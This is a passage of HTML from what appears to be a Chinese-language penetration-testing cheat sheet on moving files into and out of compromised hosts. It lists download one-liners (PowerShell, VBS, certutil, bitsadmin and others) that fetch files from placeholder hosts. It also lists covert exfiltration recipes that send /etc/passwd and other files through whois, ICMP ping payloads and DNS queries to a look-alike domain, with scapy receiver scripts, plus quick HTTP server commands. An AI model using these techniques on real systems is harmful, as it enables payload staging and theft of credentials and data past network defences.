class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$p = New-Object System.Net.WebClient </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;) </span></span></code></pre></div><p>vbs脚本 </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">Set args = Wscript.Arguments</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Url = &quot;http://domain/file&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">xHttp.Open &quot;GET&quot;, Url, False</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">xHttp.Send</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">with bStrm</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">.type = 1 &#39;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">.open</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">.write xHttp.responseBody</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">.savetofile &quot; C:\\%homepath%\\file&quot;, 2 &#39;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">end with</span></span></code></pre></div><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>执行 ：cscript test.vbs</p></blockquote>\n<p>Perl </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#!/usr/bin/perl </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">use LWP::Simple; </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">getstore(&quot;http://domain/file&quot;, &quot;file&quot;);</span></span></code></pre></div><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>执行：perl test.pl</p></blockquote>\n<p>Python </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#!/usr/bin/python </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">import urllib2 </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">u = urllib2.urlopen(&#39;http://domain/file&#39;) </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">localFile = open(&#39;local_file&#39;, &#39;w&#39;) </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">localFile.write(u.read()) </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">localFile.close()</span></span></code></pre></div><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>执行：python test.py</p></blockquote>\n<p>Ruby </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">#!/usr/bin/ruby</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">require &#39;net/http&#39;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Net::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">r = http.get(&quot;/file&quot;)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">file.write(r.body)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125;</span></span></code></pre></div><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>执行：ruby test.rb</p></blockquote>\n<p>PHP </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">&lt;?php</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$url  = &#39;http://www.example.com/file&#39;;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$path = &#39;/path/to/file&#39;;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ch = curl_init($url);</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$data = curl_exec($ch);</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">curl_close($ch);</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">file_put_contents($path, $data);</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">?&gt;</span></span></code></pre></div><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>执行：php test.php</p></blockquote>\n<p>NC<br>attacker </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">cat file | nc -l 1234</span></span></code></pre></div><p>target</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">nc host_ip 1234 &gt; file</span></span></code></pre></div><p>FTP</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">ftp 127.0.0.1 username password get file exit</span></span></code></pre></div><p>TFTP </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span></span></code></pre></div><p>Bitsadmin </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">bitsadmin /transfer n http://domain/file c:%homepath%file</span></span></code></pre></div><p>Window 文件共享 </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">net use x: \\127.0.0.1\\share /user:example.comuserID myPassword</span></span></code></pre></div><p>SCP<br>本地到远程 </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">scp file user@host.com:/tmp</span></span></code></pre></div><p>远程到本地 </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">scp user@host.com:/tmp file</span></span></code></pre></div><p>rsync<br>远程rsync服务器中拷贝文件到本地机 </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">rsync -av root@192.168.78.192::www /databack</span></span></code></pre></div><p>本地机器拷贝文件到远程rsync服务器 </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">rsync -av /databack root@192.168.78.192::www</span></span></code></pre></div><p>certutil.exe </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">certutil.exe -urlcache -split -f http://site.com/file</span></span></code></pre></div><p>copy</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">copy \\\\IP\\ShareName\\file.exe file.exe</span></span></code></pre></div><p>WHOIS<br>接收端 Host B：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">nc -vlnp 1337 | sed &quot;s/ //g&quot; | base64 -d </span></span></code></pre></div><p>发送端 Host A：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">whois -h host_ip -p 1337 `cat /etc/passwd | base64`</span></span></code></pre></div><p><a href=\"https://twitter.com/mubix/status/1102780436118409216\">WHOIS + TAR</a><br>First:  </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it</span></span></code></pre></div><p>Next</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits</span></span></code></pre></div><p>Finally</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">cat files.b64 | tr -d &#39;\\r\\n&#39; | base64 -d | tar zxv #to get the files out</span></span></code></pre></div><p>PING<br>发送端:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done</span></span></code></pre></div><p>接收端<code>ping_receiver.py</code>:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">import sys</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">try:</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    from scapy.all import *</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">except:</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    sys.exit(0)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">def process_packet(pkt):</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    if pkt.haslayer(ICMP):</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">        if pkt[ICMP].type == 8:</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">            data = pkt[ICMP].load[-4:]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">            print(f&#39;&#123;data.decode(&quot;utf-8&quot;)&#125;&#39;, flush=True, end=&quot;&quot;, sep=&quot;&quot;)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">sniff(iface=&quot;eth0&quot;, prn=process_packet)</span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">python3 ping_receiver.py</span></span></code></pre></div><p>DIG<br>发送端:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done</span></span></code></pre></div><p>接收端<code>dns_reciver.py</code>:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">try:</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    from scapy.all import *</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">except:</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">def process_packet(pkt):</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">    if pkt.haslayer(DNS):</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">        domain = pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">        root_domain = domain.split(&#39;.&#39;)[1]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">        if root_domain.startswith(&#39;gooogle&#39;):</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">            print(f&#39;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)&#125;&#39;, flush=True, end=&#39;&#39;)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">sniff(iface=&quot;eth0&quot;, prn=process_packet)</span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">python3 dns_reciver.py</span></span></code></pre></div><p>… </p>\n<h3 id=\"搭建-HTTP-server\"><a href=\"#搭建-HTTP-server\" class=\"headerlink\" title=\"搭建 HTTP server\"></a>搭建 HTTP server</h3><p>python2</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">python -m SimpleHTTPServer 1337</span></span></code></pre></div><p>python3</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">python -m http.server 1337</span></span></code></pre></div><p>PHP 5.4+</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">php -S 0.0.0.0:1337</span></span></code></pre></div><p>ruby</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&#39;</span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">ruby -run -e httpd . -p 1337</span></span></code></pre></div><p>Perl</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">perl -MHTTP::Server::Brick -e &#39;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;&#123;path=&gt;&quot;.&quot;&#125;); $s-&gt;start&#39;</span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \\/(.*) / &#125;)&#39;</span></span></code></pre></div><p>busybox httpd</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" 